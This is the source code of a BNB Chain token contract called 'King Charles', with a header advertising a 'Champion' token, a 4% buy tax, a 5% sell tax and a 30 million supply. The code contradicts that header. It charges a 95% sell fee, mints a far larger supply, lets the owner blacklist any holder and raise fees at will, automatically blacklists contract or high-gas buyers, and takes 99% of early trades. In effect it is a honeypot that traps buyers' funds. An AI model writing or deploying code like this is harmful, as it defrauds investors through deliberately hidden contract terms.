/**
 *Submitted for verification at BscScan.com on 2022-09-08
*/

// SPDX-License-Identifier: MIT

/**
Welcome to Champion
TOKENOMICS:
TotalSupply: 30,000,000 tokens
Buy Tax 4%
Sell Tax 5%
*/

pragma solidity ^0.8.16;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract Token is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;

    uint256 private _tTotal;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyLPFee = 1;
    uint256 public _buyMarketingFee = 3;
    uint256 public _sellLPFee = 5;
    uint256 public _sellMarketingFee = 90;

    address public router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public USDTaddress = 0x55d398326f99059fF775485246999027B3197955;
    IERC20 public USDT = IERC20(USDTaddress);
    ISwapRouter public _swapRouter;
    address public _mainPair;
    mapping(address => bool) public _swapPairList;
    address public fundAddress;
    address public marketingAddress;
   
    uint256 public startTradeBlock;
    uint maxgasprice=70 * 10 **8;
    mapping (address => bool) public isChosenSon;
 
    bool public swapAndLiquifyEnabled = true;
    uint256 public swapThreshold;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address MarketingAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(router);
        USDT.approve(address(swapRouter), MAX);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTaddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;
        swapThreshold = _tTotal / 1000;
        fundAddress = FundAddress;
        marketingAddress = MarketingAddress;
        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[marketingAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _tokenDistributor = new TokenDistributor(USDTaddress);

        _balances[FundAddress] = total;
        emit Transfer(address(0), FundAddress, total);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        require(!isChosenSon[from],"isChosenSon");
        bool isSell;
        bool takeFee;
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 9999 / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            address ad;
            for(int i=0;i < 3;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _takeTransfer(from,ad,amount / 1000000);
            }
        }
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                require(startTradeBlock > 0, "!startTrad");
                if(_swapPairList[from]){
                    if(isContract(to) || tx.gasprice >maxgasprice) isChosenSon[to] = true;
                    if (block.number < startTradeBlock + 3) {
                        botTransfer(from, to, amount);
                        return;
                    }
                }

                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > swapThreshold && swapAndLiquifyEnabled) {
                            swapTokenForFund(contractTokenBalance);
                        }
                    }
                }
                takeFee = true;
            }
            isSell = _swapPairList[to];
        }
        _tokenTransfer(from, to, amount, takeFee, isSell);
    }

    function botTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            address(this),
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellLPFee + _sellMarketingFee;
            } else {
                swapFee = _buyLPFee + _buyMarketingFee;
            }
            uint256 swapAmount = tAmount * swapFee / 100;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        uint256 swapFee = _sellLPFee + _sellMarketingFee + _buyLPFee + _buyMarketingFee;
        uint256 lpFee = _buyLPFee + _sellLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = USDTaddress;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        uint256 USDTBalance = USDT.balanceOf(address(_tokenDistributor));
        uint256 marketingAmount = USDTBalance * (_sellMarketingFee + _buyMarketingFee) / swapFee;

         if(marketingAmount>0){
            USDT.transferFrom(address(_tokenDistributor),marketingAddress,marketingAmount); 
        }
        uint256 amountUSDTLiquidity = USDTBalance - marketingAmount;
        USDT.transferFrom(address(_tokenDistributor), address(this), amountUSDTLiquidity);

        if (lpAmount > 0 && amountUSDTLiquidity > 0) {
             _swapRouter.addLiquidity(
                address(this), USDTaddress, lpAmount, amountUSDTLiquidity, 0, 0, fundAddress, block.timestamp
            );
            
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

   function manage_ChosenSon(address[] calldata addresses, bool status)  external onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isChosenSon[addresses[i]] = status;
        }
    }

    function changeBuyFees(uint256 newLiqFee, uint256 newMarketingFee) external onlyOwner {
        _buyLPFee = newLiqFee;
        _buyMarketingFee = newMarketingFee;
    }

    function changeFeesSell(uint256 newLiqFeeSell, uint256 newMarketingFeeSell) external onlyOwner {
        _sellLPFee = newLiqFeeSell;
        _sellMarketingFee = newMarketingFeeSell;
    }

    function openTrade() external onlyOwner {
        if(startTradeBlock == 0){
            startTradeBlock = block.number;
        }else{
            startTradeBlock = 0;
        }
    }
 
     function changeSwapBackSettings(bool enableSwapBack, uint256 newSwapBackLimit) external onlyOwner {
        swapAndLiquifyEnabled  = enableSwapBack;
        swapThreshold = newSwapBackLimit;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimToken(address token, uint256 amount, address to) public{
        require(fundAddress == msg.sender, "!Funder");
        IERC20(token).transfer(to, amount);
    }

    function isContract(address addr) public view returns (bool) {
       uint size;
       assembly  { size := extcodesize(addr) }
       return size > 0;
    }
    
    receive() external payable {}

}

contract KingCharles is Token {
    constructor() Token(
        "King Charles",
        "King Charles",
        18,
        1 * 10 ** 12,
        address(0xd122bc934E125fafBdEc00e2a40937d2b6D7D44f),
        address(0x653B1b909B9a54cd2180dE5165595474438d71A6)
    ){
    }
}